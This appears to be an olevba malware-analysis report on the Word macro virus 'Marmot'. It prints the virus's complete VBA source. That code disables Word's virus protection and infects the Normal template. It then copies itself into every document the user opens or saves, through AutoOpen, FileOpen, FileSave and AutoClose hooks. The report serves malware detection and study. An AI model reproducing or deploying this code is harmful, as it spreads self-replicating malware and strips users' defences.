olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marmot-bd22269eb2aa53f3276dcb8d2fe7c92980c20cca
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marmot-bd22269eb2aa53f3276dcb8d2fe7c92980c20cca - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sergie_Sad.bas 
in file: Virus.MSWord.Marmot-bd22269eb2aa53f3276dcb8d2fe7c92980c20cca - OLE stream: 'Macros/VBA/Sergie_Sad'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' ------------------ "ДЕНЬ СУРКА" v1.0 -----------------
' -------------- 02.02.2000 (С)Sergie Sad --------------
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Макрос создан 02.02.2000 Sergie Sad"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Normal.Sergie_Sad.AutoOpen"
Options.SaveNormalPrompt = False
Options.VirusProtection = False
On Error GoTo fail
Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="Sergie_Sad", _
        Object:=wdOrganizerObjectProjectItems
fail:
End Sub
Sub FileOpen()
Attribute FileOpen.VB_Description = "Макрос создан 02.02.2000 Sergie Sad"
Attribute FileOpen.VB_ProcData.VB_Invoke_Func = "Normal.Sergie_Sad.FileOpen"
Options.SaveNormalPrompt = False
Options.VirusProtection = False
Dialogs(wdDialogFileOpen).Show
On Error GoTo fail
Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument.FullName, Name:="Sergie_Sad", _
        Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
fail:
If (Month(Now()) = 10) And (Day(Now()) = 13) Then ask = MsgBox("Не забудь поздравить меня с днем рождения. Sergie Sad (3512) 12-6818", 4096 + 64, "Сегодня 13 октября")
End Sub
Sub FileSave()
Attribute FileSave.VB_Description = "Макрос создан 02.02.2000 Sergie Sad"
Attribute FileSave.VB_ProcData.VB_Invoke_Func = "Normal.Sergie_Sad.AutoClose"
Options.SaveNormalPrompt = False
Options.VirusProtection = False
On Error GoTo fail
ActiveDocument.Save
Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument.FullName, Name:="Sergie_Sad", _
        Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
fail:
End Sub
Sub AutoClose()
Attribute AutoClose.VB_Description = "Макрос создан 02.02.2000 Sergie Sad"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Normal.Sergie_Sad.FileClose"
If ActiveDocument.BuiltInDocumentProperties(wdPropertyLastAuthor) <> "" Then Call FileSave
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
+----------+--------------------+---------------------------------------------+

